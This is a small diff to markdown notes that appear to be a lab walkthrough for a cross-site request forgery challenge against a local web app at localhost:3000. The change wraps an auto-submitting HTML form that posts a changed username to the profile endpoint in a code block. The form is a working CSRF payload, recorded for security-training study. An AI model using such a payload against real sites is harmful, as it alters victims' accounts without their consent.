@@ -134,12 +134,13 @@ download firefox 96.0
 http://localhost:3000/profile > login into account
 http://htmledit.squarefree.com/
 submit form:
+```
 <form action="http://localhost:3000/profile" method="POST">
   <input name="username" value="CSRF"/>
   <input type="submit"/>
 </form>
 <script>document.forms[0].submit();</script>
-
+```
 
 
 
